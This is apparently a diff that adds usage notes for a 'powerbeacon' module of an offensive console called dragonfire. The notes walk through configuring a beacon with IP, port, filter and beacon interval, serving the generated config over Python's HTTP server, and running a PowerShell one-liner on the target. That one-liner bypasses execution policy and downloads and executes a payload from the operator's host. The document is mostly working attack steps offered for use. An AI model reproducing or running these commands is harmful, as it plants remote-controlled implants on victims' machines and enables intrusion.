@@ -1,0 +1,33 @@
+powerbeacon
+----------
+# git <git@gitlab.com/dragonfire.git>
+
+cd /dragonfire/bin/dfconsole/
+
+python dfconsole.py
+
+show modules 
+use powerbeacon
+show info 
+
+set ip <>
+set port <>
+set path <>
+set filter <>
+set consumer <>
+set output_file <>
+set beacon_interval <>
+set use_ssl no
+run 
+
+# start server 
+mkdir www
+cp /dragonfire/bin/dfconsole/output/<config_file> www/.
+cd www
+python -m http.server <port>
+
+# install with PS_DLX
+# run on target
+powershell -ex bypass -c "iex(new-object net.webclient).downloadstring('http://<IP>:<port>/<payload>')"
+ 
+++++++++++  
